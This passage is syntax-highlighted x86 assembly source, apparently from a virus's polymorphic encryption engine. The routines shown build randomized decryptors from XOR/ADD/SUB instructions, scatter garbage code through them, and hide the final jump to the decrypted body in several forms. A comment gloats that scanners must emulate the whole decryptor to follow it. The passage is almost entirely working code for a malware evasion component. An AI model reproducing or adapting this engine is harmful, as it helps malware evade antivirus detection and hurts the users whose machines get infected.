                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc5">@@RJ_98</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">             </span><span class="sc1">; Store the addition</span><span class="sc0">
     </span><span class="sc5">@@Next_01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DecryptKey</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the decryption key and</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@IFC_Next_01</span><span class="sc0">           </span><span class="sc1">; jump to store it.</span><span class="sc0">

 </span><span class="sc1">;; Here we use a key register, that's it:</span><span class="sc0">
 </span><span class="sc1">;; XOR/ADD/SUB [Register1+(opt.Register2+)AdditionValue],KeyRegister</span><span class="sc0">
 </span><span class="sc5">@@WithKeyReg</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">EncryptType</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@PutSUBReg</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@PutADDReg</span><span class="sc0">
   </span><span class="sc5">@@PutXORReg</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">31h</span><span class="sc0"> </span><span class="sc1">; XOR opcode</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@PutReg</span><span class="sc0">
   </span><span class="sc5">@@PutADDReg</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0"> </span><span class="sc1">; ADD opcode</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@PutReg</span><span class="sc0">
   </span><span class="sc5">@@PutSUBReg</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">29h</span><span class="sc0"> </span><span class="sc1">; SUB opcode. This time this is the first op-</span><span class="sc0">
                                </span><span class="sc1">; code</span><span class="sc0">
    </span><span class="sc5">@@PutReg</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc1">; Set dword addition in the 2nd opcode</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TuaregFlags</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0"> </span><span class="sc1">; Buffer register?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@NoBufferReg2</span><span class="sc0">     </span><span class="sc1">; If not, jump</span><span class="sc0">
   </span><span class="sc1">;; This time we made:</span><span class="sc0">
   </span><span class="sc1">;; XOR/ADD/SUB [BufferReg+Addition],KeyRegister</span><span class="sc0">
      </span><span class="sc5">@@WithBufferReg2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BufferRegister</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the buffer register</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">  </span><span class="sc1">; Do we modify the addition?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Next_02</span><span class="sc0">      </span><span class="sc1">; Jump if we store the decrypt data begin</span><span class="sc0">
                                     </span><span class="sc1">; address directly</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">     </span><span class="sc1">; Get a random value to ADD</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BufferRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoADD</span><span class="sc0">      </span><span class="sc1">; Construct an ADD (or similar) with the</span><span class="sc0">
                                   </span><span class="sc1">; buffer register and the random value</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0"> </span><span class="sc1">; Make garbage</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyRegister</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the key register</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">       </span><span class="sc1">; Construct the second opcode with the</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">      </span><span class="sc1">; buffer register and the key register</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">               </span><span class="sc1">; Store the opcode</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">EncryptedDataBeginAddress</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Calculate the</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">     </span><span class="sc1">; addition after the ADD</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@IFC_Next_01</span><span class="sc0">  </span><span class="sc1">; Jump to store it and finish</span><span class="sc0">

   </span><span class="sc1">;; Here we can construct an instruction similar to the above but using</span><span class="sc0">
   </span><span class="sc1">;; Index2 or use Index2 and BufferReg as a two-index memory reference.</span><span class="sc0">
      </span><span class="sc5">@@NoBufferReg2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index2Register</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">  </span><span class="sc1">; Randomly jump to complete the instruc-</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Next_02</span><span class="sc0">      </span><span class="sc1">; tion directly</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TuaregFlags</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">; Double XORing?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@UseBufferRegister2</span><span class="sc0"> </span><span class="sc1">; If so, use only buffer register</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">  </span><span class="sc1">; Select if we use only Index2 or buffer</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@UseBufferRegister2</span><span class="sc0"> </span><span class="sc1">; too</span><span class="sc0">
      </span><span class="sc1">;; Here we construct:</span><span class="sc0">
      </span><span class="sc1">;; XOR/ADD/SUB [Index2+Addition],KeyRegister</span><span class="sc0">
          </span><span class="sc5">@@UseIndexRegister2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index2Register</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoADD</span><span class="sc0">   </span><span class="sc1">; Modify the Index2 with an ADD</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">  </span><span class="sc1">; Make garbage</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">          </span><span class="sc1">; Construct the opcode of the instruction</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">EncryptedDataBeginAddress</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Calculate the</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">      </span><span class="sc1">; addition and jump to store it</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@IFC_Next_01</span><span class="sc0">
    </span><span class="sc1">;; Here we are going to use the buffer register and the Index2 register.</span><span class="sc0">
    </span><span class="sc1">;; As before, we'll use the buffer register with a random value instead</span><span class="sc0">
    </span><span class="sc1">;; of adjusting the addition, so the relative address will be represented</span><span class="sc0">
    </span><span class="sc1">;; in two registers plus a dword addition.</span><span class="sc0">
          </span><span class="sc5">@@UseBufferRegister2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BufferRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoMOV</span><span class="sc0">    </span><span class="sc1">; Make a MOV BufferReg,RandomValue (or simi-</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0"> </span><span class="sc1">; lar) and some garbage</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">84h</span><span class="sc0">       </span><span class="sc1">; Fixed (agh) 2nd opcode, which signali-</span><span class="sc0">
                                      </span><span class="sc1">; ces dword addition and the use of a</span><span class="sc0">
                                      </span><span class="sc1">; third opcode</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">       </span><span class="sc1">; Set the key register</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">                </span><span class="sc1">; Store the opcode</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BufferRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index2Register</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">setz</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@RJ_02</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
       </span><span class="sc5">@@RJ_02</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">      </span><span class="sc1">; Now construct the third opcode, which</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">      </span><span class="sc1">; means (with the 2nd) [Reg1+Reg2+Value]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@RJ_97</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
       </span><span class="sc5">@@RJ_97</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">EncryptedDataBeginAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">    </span><span class="sc1">; Construct the addition...</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@IFC_Next_01</span><span class="sc0"> </span><span class="sc1">; ...and jump to store it</span><span class="sc0">

   </span><span class="sc1">;; Here to put directly the decryption address added to the index register</span><span class="sc0">
     </span><span class="sc5">@@Next_02</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">   </span><span class="sc1">; Bind the registers to the opcode</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">            </span><span class="sc1">; Store the opcode</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">EncryptedDataBeginAddress</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the addr.</span><span class="sc0">
    </span><span class="sc5">@@IFC_Next_01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">         </span><span class="sc1">; Store it</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">  </span><span class="sc1">; Make garbage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                      </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">InsertDecryption</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; Final jump to the decrypted part. With also a wide variety of methods, with</span><span class="sc0">
</span><span class="sc1">;; this there isn't a direct jump to the decrypted part, so the decryptor has</span><span class="sc0">
</span><span class="sc1">;; to be emulated completely to know where the decryptor jumps after the work</span><span class="sc0">
</span><span class="sc1">;; is done. Hahahahahahahaha! (devilish laugh :)</span><span class="sc0">
</span><span class="sc5">DoFinalJMP</span><span class="sc0">      </span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc1">;; Ways of jumping to the decrypted part:</span><span class="sc0">
</span><span class="sc1">; Common entry:</span><span class="sc0">
</span><span class="sc1">; MOV [Address], Value (in many and variated types)</span><span class="sc0">
</span><span class="sc1">; (optional) XOR/ADD/SUB [Address], Value</span><span class="sc0">
</span><span class="sc1">;; Jump:</span><span class="sc0">
</span><span class="sc1">; JMP [Address]</span><span class="sc0">
</span><span class="sc1">; PUSH [Address] / RET</span><span class="sc0">
</span><span class="sc1">; MOV Reg,[Address] / JMP Reg</span><span class="sc0">
</span><span class="sc1">; MOV Reg,Address / JMP [Reg]</span><span class="sc0">
</span><span class="sc1">;; In the common entry, the value and or the memory address can be in regis-</span><span class="sc0">
</span><span class="sc1">;; ters (the value is moved to a random register before using that value).</span><span class="sc0">

                </span><span class="sc6">pushad</span><span class="sc0">          </span><span class="sc1">; Undocumented instruction :P</span><span class="sc0">
    </span><span class="sc5">@@Repeat</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SelectOnlyTwoRegs</span><span class="sc0"> </span><span class="sc1">; It changes the reserve of four re-</span><span class="sc0">
                                        </span><span class="sc1">; gisters to only two (no more needed)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReservedBssAddress</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; We reserved this addr.</span><span class="sc0">
                                </span><span class="sc1">; to avoid that the calling to DoRandomGarbage</span><span class="sc0">
                                </span><span class="sc1">; overwrites the data that we put here while</span><span class="sc0">
                                </span><span class="sc1">; the decryptor is running.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">EncryptedDataBeginAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoMOVMemValue</span><span class="sc0">
      </span><span class="sc5">@@Next</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">   </span><span class="sc1">; Make garbage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SelectOnlyTwoRegs</span><span class="sc0"> </span><span class="sc1">; Reselect two registers and put</span><span class="sc0">
                                          </span><span class="sc1">; them as "reserved"</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index1Register</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">    </span><span class="sc1">; Get the way of jumping to the address in</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">     </span><span class="sc1">; our variable</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@JMP__</span><span class="sc0">     </span><span class="sc1">; Make JMP [Memory_Address]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@PUSH__RET</span><span class="sc0"> </span><span class="sc1">; Make PUSH [Memory_Address]/RET</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MOV__JMP</span><span class="sc0">  </span><span class="sc1">; Make MOV Reg,[Memory_Address]/JMP Reg</span><span class="sc0">
        </span><span class="sc1">; Make MOV Reg,Memory_Address/JMP [Reg]</span><span class="sc0">
   </span><span class="sc5">@@MOVJMP__</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">setz</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MJ__Direct01</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@MJ__Direct03</span><span class="sc0">
      </span><span class="sc5">@@MJ__Direct01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">; EAX=Reserved memory address</span><span class="sc0">
      </span><span class="sc5">@@MJ__Direct03</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoMOV</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@MJ__Direct02</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A0FFh</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Return</span><span class="sc0">
   </span><span class="sc5">@@MJ__Direct02</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">      
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MJ__EBP</span><span class="sc0">        </span><span class="sc1">; If the reserved register is EBP, jump</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20FFh</span><span class="sc0">   </span><span class="sc1">; Opcode of JMP [Reg]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">      </span><span class="sc1">; Set the used register</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">               </span><span class="sc1">; Insert the instruction</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Return</span><span class="sc0">      </span><span class="sc1">; Return</span><span class="sc0">
       </span><span class="sc5">@@MJ__EBP</span><span class="sc4">:</span><span class="sc0">
